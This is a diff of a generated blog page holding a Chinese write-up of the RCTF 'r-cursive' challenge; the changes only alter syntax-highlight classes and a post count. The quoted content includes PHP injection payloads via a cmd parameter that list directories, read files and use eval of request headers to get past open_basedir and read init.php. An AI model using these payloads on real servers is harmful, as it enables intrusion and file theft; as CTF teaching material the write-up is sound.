@@ -385,9 +385,9 @@
 <li>不太明白这<code>个</code>‘;’ ===`的意思……</li>
 <li>(?R)?  不懂……</li>
 </ol>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?: 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</span><br><span class="line">\W: 匹配非字母、数字、下划线。等价于 <span class="string">'[^A-Za-z0-9_]'</span>。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?: 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。</span><br><span class="line">\W: 匹配非字母、数字、下划线。等价于 &apos;[^A-Za-z0-9_]&apos;。</span><br></pre></td></tr></table></figure>
 <p><strong>0x01</strong> 正则匹配：可以递归执行函数，不可以带参数，于是学习各种姿势</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=<span class="built_in">print</span>(phpinfo());</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(readdir(opendir(getcwd()))); 可以列目录</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(readfile(readdir(opendir(getcwd())))); 读文件</span></span><br><span class="line"><span class="bash">?cmd=<span class="built_in">print</span>(dirname(dirname(getcwd()))); <span class="built_in">print</span>出/var/www</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(phpinfo());</span><br><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure>
 <p><strong>0x02</strong>  沙盒绕过</p>
 <p><code>?cmd=print(phpinfo());</code>发现</p>
 <p><img src="1.png" alt=""></p>
@@ -424,7 +424,7 @@
 <ol>
 <li><p>读取flag</p>
 <p>现在已经经open_basedir修改为/var/www/sandbox/了，于是读取init.php</p>
-<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /<span class="number">269577</span>e99009788991126ac76f84c473aa02192f/index.php?<span class="keyword">cmd</span><span class="bash">=<span class="built_in">eval</span>(implode(getallheaders())); HTTP/1.1</span></span><br><span class="line"><span class="bash">cmd: <span class="built_in">echo</span> ini_get(<span class="string">"open_basedir"</span>);<span class="variable">$m3lon</span> = readfile(<span class="string">"/var/www/sandbox/init.php"</span>);<span class="built_in">print</span> <span class="variable">$m3lon</span>;//</span></span><br><span class="line"><span class="bash">Host:  .r-cursive.ml</span></span><br><span class="line"><span class="bash">Content-Length: 2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /269577e99009788991126ac76f84c473aa02192f/index.php?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: echo ini_get(&quot;open_basedir&quot;);$m3lon = readfile(&quot;/var/www/sandbox/init.php&quot;);print $m3lon;//</span><br><span class="line">Host:  .r-cursive.ml</span><br><span class="line">Content-Length: 2</span><br></pre></td></tr></table></figure>
 <p>​</p>
 <p><img src="5.png" alt=""></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">"open_basedir"</span>, $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">"/:/tmp/"</span>);</span><br><span class="line">    <span class="comment">// flag: RCTF&#123;apache_mod_vhost_alias_should_be_configured_correctly&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -572,7 +572,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">28</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
